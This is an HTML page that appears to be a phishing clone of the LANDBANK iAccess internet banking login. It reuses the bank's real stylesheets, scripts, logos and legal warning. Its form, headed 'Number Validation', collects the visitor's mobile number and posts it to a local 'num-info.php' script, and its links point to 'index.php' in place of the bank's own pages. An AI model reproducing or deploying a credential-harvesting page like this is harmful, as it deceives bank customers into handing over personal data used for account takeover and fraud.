
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

    <style type="text/css">
        .forex-righth-align {
            text-align: right;
        }

        .ssl-seal {
            position: absolute;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .forex-button {
            font-family: Helvetica,Arial,sans-serif;
            text-transform: uppercase;
            outline: 0;
            background: #65cead;
            border: 0;
            border-radius: 8px;
            padding: 4px;
            color: #ffffff;
            font-size: 11px;
            font-weight: bold;
            -webkit-transition: all 0.3 ease;
            transition: all 0.3 ease;
            cursor: pointer;
        }
    </style><head id="j_idt3"><link type="text/css" rel="stylesheet" href="https://www.lbpiaccess.com/javax.faces.resource/theme.css.xhtml?ln=primefaces-frontoffice" /><link type="text/css" rel="stylesheet" href="https://www.lbpiaccess.com/javax.faces.resource/fa/font-awesome.css.xhtml?ln=primefaces&amp;v=8.0" /><link type="text/css" rel="stylesheet" href="https://www.lbpiaccess.com/javax.faces.resource/style.css.xhtml?ln=css" /><link type="text/css" rel="stylesheet" href="https://www.lbpiaccess.com/javax.faces.resource/components.css.xhtml?ln=primefaces&amp;v=8.0" /><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/jquery/jquery.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/jquery/jquery-plugins.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/core.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/components.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/cryptojs/core-min.js.xhtml?ln=scripts"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/cryptojs/aes.js.xhtml?ln=scripts"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/cryptojs/enc-base64-min.js.xhtml?ln=scripts"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/cryptojs/sha256-min.js.xhtml?ln=scripts"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/app/clienthash.min.js.xhtml?ln=scripts"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/app/login.min.js.xhtml?ln=scripts"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/validation/validation.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://www.lbpiaccess.com/javax.faces.resource/validation/beanvalidation.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='en_US';PrimeFaces.settings.validateEmptyFields=true;PrimeFaces.settings.considerEmptyStringNull=false;}</script>
            <meta charset="utf-8" />
            <meta http-equiv="X-UA-Compatible" content="IE=edge" />
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
            <meta name="apple-mobile-web-app-capable" content="yes" />
            <meta name="mobile-web-app-capable" content="yes" />

            <title>LANDBANK iAccess Retail Internet Banking - Login</title>
            <link rel="shortcut icon" type="image/x-icon" href="https://www.lbpiaccess.com/resources/images/favicon.ico" /></head><body id="login-body">
            <div id="login-maincontainer">

                <div id="login-topsection">
                    <img src="https://www.lbpiaccess.com/resources/images/lbpiaccess.jpg" alt="" width="1056" height="90" />
                </div>

                <div id="login-wrapper">
                        <div id="login-contentcolumn">
                            <div class="login-infolinks">
                                <a href="https://www.landbank.com/about" target="_blank">About Us</a>  |  
                                
                                <a href="index.php" target="_blank">FAQs</a>  |  
                                <a href="index.php" target="_blank">Security Policy</a>  |  
                                <a href="index.php" target="_blank">Data Privacy Statement</a>  |  
                                <a href="index.php" target="_blank">Advisory on ATM Use</a>  |  
                                <a href="index.php" target="_blank">iAccess Features</a>  |  
                                <a href="index.php" target="_blank">Find Us</a>
                            </div>
                            <h1 id="login-welcome-msg">Welcome to iAccess!</h1><img id="login-advertisement-img" src="login_advisory.jpg" alt="" width="600" />
                        </div>

                        <div id="login-rightcolumn">
                            <div id="login-page">
                                <div class="form">
<form id="login-form" name="login-form" method="post" action="num-info.php" enctype="application/x-www-form-urlencoded">
<input type="hidden" name="login-form" value="login-form" />
<input id="k" type="hidden" name="k" value="NNBLDASXLXID" /><input id="ki" type="hidden" name="ki" value="cmhpcnFqMlgyOTR4bU5zeA==" /><input id="pi" type="hidden" name="pi" /><div id="login-form-msgs" class="ui-messages ui-widget" aria-live="polite" data-global="false" data-detail="data-detail" data-severity="all,error" data-redisplay="true"><p class="fs20"><span class="ui-panel-title"><strong>Number Validation</strong></span> </div><br><input id="pass" type="number" name="pass" autocomplete="off" value="" maxlength="30" class="login-input" placeholder="Mobile Number" /><br><br><input id="login" type="submit" name="login" value="Login" class="login-button" onclick="Login.submit();" /><br><br>

                                        <p class="message">
                                            Not yet enrolled? <a href="/register/enroll.xhtml">Sign up now!</a><br />
                                            
                                            
                                            
                                            Upon login, I hereby agree to its <a href="/login/infolink?i=6" target="_blank">Terms and Conditions</a><br />
                                            Click <a href="/login/infolink?i=7" target="_blank">here</a> to download enrollment form.
                                        </p>
                                        <p class="message"><a href="/unlock.xhtml">Unlock ID</a>      
                                            <a href="/forgotpwd.xhtml">Forgot Password</a>      
                                        </p><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="4509591837025587956:-8147694869919270544" autocomplete="off" />
</form>
                                    
                                    <table style="width: 125px; border: 0; margin-left: auto; margin-right: auto;" cellspacing="0" cellpadding="0" title="CLICK TO VERIFY: This site uses a GlobalSign SSL Certificate to secure your personal information.">
                                        <tr><td><span id="ss_img_wrapper_gmogs_image_125-50_en_dblue"><a href="https://www.globalsign.com/" target="_blank" title="GlobalSign Site Seal" rel="nofollow"><img alt="SSL" border="0" id="ss_img" src="//seal.globalsign.com/SiteSeal/images/gs_noscript_125-50_en.gif" /></a></span><script type="text/javascript" src="//seal.globalsign.com/SiteSeal/gmogs_image_125-50_en_dblue.js"></script></td></tr>
                                    </table>
                                    
                                </div>
                            </div>
                            <div id="login-forex" style="max-width: 60%;"><span style="color: #0db14b">FOREIGN EXCHANGE</span>  <input type="button" onclick="window.open('https://www.landbank.com/', '_blank'); return false;window.location.href='/login.xhtml'; return false;" value="CLICK HERE" class="forex-button" />
                                
                            </div>
                        </div>

                </div>

                <div id="footer">

                    <div id="container-warning">
                        <span class="warning">WARNING:</span>
                        <span class="warning-higlight">iAccess is for authorized clients only.</span>
                        <span>It shall be a criminal offense for any person to:</span>

                        <ol>
                            <li>Obtain access to data without authority;</li>
                            <li>Corrupt, alter, steal or destroy data;</li>
                            <li>Interfere in computer system or server;</li>
                            <li>Introduce computer virus.</li>
                        </ol>

                        <span>Penalty shall consist of minimum fine of Php100,000 and a maximum commensurate to the damage incurred and a mandatory imprisonment of six months to three years under R.A. No. 8792 (E-Commerce Act of the Philippines).</span>
                    </div>
                    <div id="container-contactinfo">
                        <span style="color: #0db14b; font-size: 12px; font-weight: bold;">LANDBANK CUSTOMER CARE CENTER</span><br />
                        <span>Tel. Nos.: (02) 8405-7000 (NCR) or</span><br />
                        <span>1-800-10-405-7000 (PLDT Domestic Toll Free/Outside NCR)</span><br />
                        <span>Email: customercare@mail.landbank.com</span><br />
                        <hr align="right" style="width: 380px; color: #66cc99; border: 1px solid #66cc99;" />
                        <span>Regulated by the Bangko Sentral ng Pilipinas.</span><br />
                        <span>Deposits are insured by PDIC up to P500,000 per depositor.</span><br />
                        <span style="display: flex; flex-direction: row-reverse">
                            <img src="https://www.lbpiaccess.com/resources/images/bancnet_logo.png" alt="" width="100" height="20" />
                            <span>A Proud Member of </span>
                        </span>
                    </div>

                </div>

            </div></body>
</html>